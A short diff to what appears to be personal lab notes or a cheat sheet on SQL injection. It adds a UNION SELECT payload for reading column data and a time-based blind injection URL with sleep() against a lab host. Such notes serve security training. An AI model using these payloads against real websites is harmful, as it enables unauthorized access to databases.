@@ -59,5 +59,10 @@ If the payload works, it's time to read the database tables:
 
 If a table is found:
 ```
-	' UNION SELECT null, null FROM TABLE -- 
+' UNION SELECT null, COLUMN_NAME FROM TABLE_NAME -- 
+```
+
+#### Blind SQLI
+```
+http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- -
 ```
